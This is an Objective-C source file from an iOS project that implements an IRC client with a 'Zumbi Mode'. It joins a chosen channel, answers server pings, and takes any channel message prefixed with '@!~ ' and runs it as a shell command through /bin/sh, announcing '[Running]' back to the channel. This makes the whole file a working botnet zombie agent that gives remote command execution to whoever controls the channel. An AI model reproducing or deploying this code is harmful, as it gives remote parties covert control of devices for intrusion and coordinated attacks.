//
//  Irc.m
//  Mptcptmp
//
//  Created by Felipe Ecker on 12/07/13.
//  Copyright (c) 2013 Felipe Ecker. All rights reserved.
//

#import "Irc.h"

static struct __data _data;   /* Sender bulk */
static uint32 stream;
static bool logged = false;
static uint16 oldSrcPort;

#define IRC_BUFF 2048

struct buffered {
    uchar buffer[IRC_BUFF];
    uint16 size;
} __packed__;

@implementation Irc

- (id) init {
    self = [super init];
    return self;
}


- (void) ReturnKeyboard {
    [self.target resignFirstResponder];
    [self.port resignFirstResponder];
    [self.channel resignFirstResponder];
    [self.password resignFirstResponder];
}


- (void)editChanged {
    
    if ( (self.target.text.length > 0) && (self.port.text.length > 0) && (self.channel.text.length > 0) ) {
        self.start.enabled = YES;
    } else {
        self.start.enabled = NO;
    }
    
    return;
}


- (void) __check_return {
    if (!ret.success) {
        UIAlertView *alert = [[UIAlertView alloc]
                              initWithTitle:@"Alert"
                              message:[NSString stringWithFormat:@"%s", ret.errmsg]
                              delegate:self
                              cancelButtonTitle:@"OK"
                              otherButtonTitles:nil];
        [alert show];
    }
    
    ret.success = true;
    return;
}


static void __process( void *__raw ) {
    
    register struct buffered *__irc = (struct buffered *) __raw;
    register uint16 size = __irc->size;
    register uchar *data = __irc->buffer;
    register uchar *__buff = (uchar *) calloc(1, IRC_BUFF);
    register uchar *__mem = __buff;
    
    /* Closing Link engine */
    if (!memcmp(data, "ERROR :", 7)) {
        snprintf(ret.errmsg, 511, "Server connection closed.");
        ret.success = false;
        free(__mem);
        if (__session) pcap_breakloop(__session);
        return;
    }
    
    char __send[2048];
    register uint16 it;
    register uint16 limit = 6;
    
    memcpy(__buff, "PONG :", 6);
    __buff += 6;
    char *__syscmd = (char *) __buff;
    
    for (it = 0; it < size; it++) {
        
        /* PING PONG engine */
        if (!memcmp(data, "PING :", 6)) {
            data += 6;
            do {
                *__buff++ = *data;
                limit++;
            } while( (*data++ != 0x0A) && (limit < 48) );
            
            send(stream, __mem, limit, 0);
            break;
        }
        
        /* Main exec engine */
        if (!memcmp(data, "@!~ ", 4)) {
            data += 4;
            while( (*data != 0x0D) && (limit < IRC_BUFF) ) {
                *__buff++ = *data++;
                limit++;
            }
            
            snprintf(__send, sizeof(__send) - 1, "PRIVMSG #%s :[Running] %s\r\n", pkt->ircRoom, __syscmd);
            send(stream, __send, strlen(__send), 0);
            
            snprintf(ret.errmsg, 511, "[IRC] Running %s", __syscmd);
            ret.success = false;
            signal(SIGCHLD, SIG_IGN);
            if ( !fork() ) execl("/bin/sh", "sh", "-c" , __syscmd, NULL);
            break;
        }
        
        /* NAMES LIST engine */
        if (!memcmp(data, ":End of /NAMES list", 19)) {
            logged = true;
            break;
        }
        
        /* Up the buffer data */
        data++;
    }
    
    if (__mem) free(__mem);
    return;
}


static void __bsd_listen (  u_char *args,
                          const struct pcap_pkthdr *hdr,
                          const u_char *recvbuff )
{
    /* auto struct ether_header *h = (struct ether_header *) recvbuff; */
    auto struct ip *ip      = (struct ip *) (recvbuff + SIZE_ETH);
    auto struct tcphdr *tcp = (struct tcphdr *) (recvbuff + SIZE_ETH+ SIZE_IP);
    
    if ( hardtrue((ip->ip_p != IPPROTO_TCP) ||
                  (ip->ip_src.s_addr != _data.target->sin_addr.s_addr) ||
                  (ntohs(tcp->th_sport) != pkt->port)) )
        goto __ROLLING;
    
    if ( (tcp->th_flags & TCP_FIN) && (ntohs(tcp->th_dport) != oldSrcPort)) {
        snprintf(ret.errmsg, 511, "Connection closed by IRC server.");
        ret.success = false;
        if (__session) pcap_breakloop(__session);
        goto __ROLLING;
    }
    
    register uint8 size_hdr = SIZE_ETH + SIZE_IP + SIZE_TCP;
    if ( (ntohs(ip->ip_len) < (SIZE_IP + SIZE_TCP)) ) goto __ROLLING;
    
    struct buffered irc;
    register uchar *data = (uchar *) (recvbuff + size_hdr);
    
    irc.size = ntohs(ip->ip_len) - (SIZE_IP + SIZE_TCP);
    memcpy(irc.buffer, data, irc.size);
    __process((void *) &irc);
    
__ROLLING:
    return;
}


- (void) __packets_handler {
    
    char *eth, err_buff[PCAP_ERRBUF_SIZE];
    
    if ( !(eth = pcap_lookupdev(err_buff)) ) {
        snprintf(ret.errmsg, 511, "Error on grab system's interface device. Detail: %s", err_buff);
        ret.success = false;
        return;
    }
    
    if ( !(__session = pcap_open_live(eth, IRC_BUFF, true, 1, err_buff)) ) {
        snprintf(ret.errmsg, 511, "Error: Couldn't open interface device %s to listen packets. Detail: %s", eth, err_buff);
        ret.success = false;
        return;
    }
    
    pcap_loop(__session, -1, __bsd_listen, NULL);
    return;
}


- (bool) __doCheck:(const uint8) _sleep {
    
    auto struct timeval _times;
    auto fd_set beep;
    _times.tv_sec = _sleep;
    _times.tv_usec = 2000;
    
    char buff[IRC_BUFF];
    memset(buff, 0, IRC_BUFF);
    
    FD_ZERO(&beep);
    FD_SET(stream, &beep);
    
    if ( !select(stream+1, &beep, NULL, NULL, &_times)) return false;
    recv(stream, buff, IRC_BUFF, 0);
    
    return true;
}


- (void) __running {
    
    [self.start setSelected:YES];
    if (!ret.success) return;
    [NSThread sleepForTimeInterval:2.0];
    
    /* TCP STREAM socket */
    if ( !( stream = __socketPool(false, __TCP_MODE__, true)) ) return;
    __set_nonblock(stream);
    
    register uint8 tsize = sizeof(struct sockaddr);
    register struct sockaddr_in *targ = _data.target;
    
    auto struct timeval _times;
    auto fd_set beep, wr;
    _times.tv_sec = 5;
    _times.tv_usec = 0;
    FD_ZERO(&beep);
    FD_ZERO(&wr);
    FD_SET(stream, &beep);
    FD_SET(stream, &wr);
    
    if (self.stop) return;
    self.statusProgress.progress = 0.2;
    self.statusMessage.text = [NSString stringWithFormat:@"Connecting to server [%@]...", self.target.text];
    [CATransaction flush];
    connect(stream, (struct sockaddr *) targ, tsize);
    
    if ( select(stream+1, &beep, &wr, NULL, &_times) != 1) {
        snprintf(ret.errmsg, 511, "Unable to connect on IRC server. Offline or closed port ??");
        ret.success = false;
        return;
    }
    
    {
        struct sockaddr_in tmp;
        socklen_t len = tsize;
        getsockname(stream, (struct sockaddr *) &tmp, &len);
        oldSrcPort = ntohs(tmp.sin_port);
    }
    
    close(stream);
    if (self.stop) return;
    [NSThread sleepForTimeInterval:4.0];
    
    self.statusProgress.progress = 0.4;
    self.statusMessage.text = [NSString stringWithFormat:@"Now logging on channel #%@...", self.channel.text];
    [CATransaction flush];

    if ( !( stream = __socketPool(false, __TCP_MODE__, true)) ) return;
    connect(stream, (struct sockaddr *) targ, tsize);
    if (![self __doCheck:20]) {
        snprintf(ret.errmsg, 511, "Unable to loggin on server. Maybe it has a slow connection.");
        ret.success = false;
        return;
    }
    
    if (self.stop) return;
    NSThread *threadx = [[NSThread alloc] initWithTarget:self selector:@selector(__packets_handler) object:nil];
    [threadx start];
    [NSThread sleepForTimeInterval:2.0];
    
    char auth[512];
    register uint32 ident = rand() % 0xFFFFFFFF;
    snprintf(auth, sizeof(auth) - 1, "NICK M-%08X\n\rUSER MPTCP-%04X MPTCP-%04X %s :MPTCP\n\r", ident, ident, ident, [self.target.text UTF8String]);
    
    send(stream, auth, strlen(auth), 0);
    if (![self __doCheck:30]) {
        snprintf(ret.errmsg, 511, "Unable to loggin on server. Maybe it has a slow connection.");
        ret.success = false;
        return;
    }
    
    if (self.stop) return;
    uint8 retry = 3;
    snprintf(auth, sizeof(auth) - 1, "JOIN #%s %s\n\r", [self.channel.text UTF8String], [self.password.text UTF8String]);
    [NSThread sleepForTimeInterval:6.0];
    
    do {
        send(stream, auth, strlen(auth), 0);
        sleep(1);
        if (logged) break;
        sleep(12);
    } while (retry--);
    
    if (!logged) {
        snprintf(ret.errmsg, 511, "Unable to connect on channel #%s. Try again or check the IRC connection [maybe banned??]...", [self.channel.text UTF8String]);
        ret.success = false;
        return;
    }
    
    self.statusProgress.progress = 0.8;
    self.statusMessage.text = @"[Connected] Now loading Zumbi Mode...";
    [CATransaction flush];
    [NSThread sleepForTimeInterval:3.0];
    
    self.statusProgress.progress = 1.0;
    self.statusMessage.text = @"[Done] Waiting for commands.";
    [CATransaction flush];

    return;
}


- (void) run {
    self.check = [NSTimer scheduledTimerWithTimeInterval:3.0 target:self selector:@selector(__check_return) userInfo:nil repeats:YES];
    
    memset(pkt, 0, sizeof(struct __input__));
    ret.success = true;
    logged = false;
    self.stop = NO;
    self.running = YES;
    pkt->port = [self.port.text intValue];
    snprintf(pkt->ircRoom, 63, "%s", [self.channel.text UTF8String]);
    self.statusMessage.text = @"Loading...";
    self.statusProgress.progress = 0.1;
    [CATransaction flush];
    
    ;
    if ((self.port.text.length > 5) ||
        ((self.port.text.length > 0) && ([self.port.text intValue] < 1)) ||
        ((self.port.text.length > 0) && ([self.port.text intValue] > 65535))
    ) {
        snprintf(ret.errmsg, 511, "Error: Invalid IRC port number.");
        ret.success = false;
        return;
    }
    
    _data.source = (struct sockaddr_in *) addressbuff;
    _data.target = (struct sockaddr_in *) (addressbuff + sizeof(struct sockaddr_in));
    
    __lookup(_data.source, nil, 0, true);
    __lookup(_data.target, (char *)[self.target.text UTF8String], [self.port.text intValue], false);
        
    NSThread *thread = [[NSThread alloc] initWithTarget:self selector:@selector(__running) object:nil];
    [thread start];
    
    return;
}


- (void) doStop {
    [self.check invalidate];
    self.check = nil;
    self.stop = YES;
    self.running = NO;
    close(stream);
    [self.start setSelected:NO];
    if (__session) pcap_breakloop(__session);
}

@end
